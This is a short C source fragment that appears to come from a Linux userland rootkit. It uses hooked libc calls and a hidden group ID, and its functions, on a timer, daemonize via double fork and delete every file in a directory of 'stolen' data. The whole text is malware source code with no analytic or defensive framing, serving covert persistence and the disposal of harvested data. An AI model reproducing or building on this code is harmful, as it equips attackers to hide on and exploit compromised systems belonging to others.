void rmstolens(void){
    DIR *dp;
    struct dirent *dir;
    size_t pathlen;

    hook(COPENDIR, CREADDIR, CUNLINK);

    dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = LEN_INTEREST_DIR + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
        call(CUNLINK, path);
    }
    closedir(dp);
}

void cleanstolen(void){
    int curtime = time(NULL);
    
    if(itistime(CLEANEDTIME_PATH, curtime, FILE_CLEANSE_TIMER)){
        pid_t pid = fork();
        if(pid < 0) return;
        if(pid > 0){
            writenewtime(CLEANEDTIME_PATH, curtime);
            return;
        }

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        /* close all open fds */
        for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
            close(i);

        if(setsid() < 0)
            exit(0);

        pid = fork();
        if(pid != 0) exit(0);

        hook(CSETGID);
        call(CSETGID, readgid());
        rmstolens();
        exit(0);
    }
}
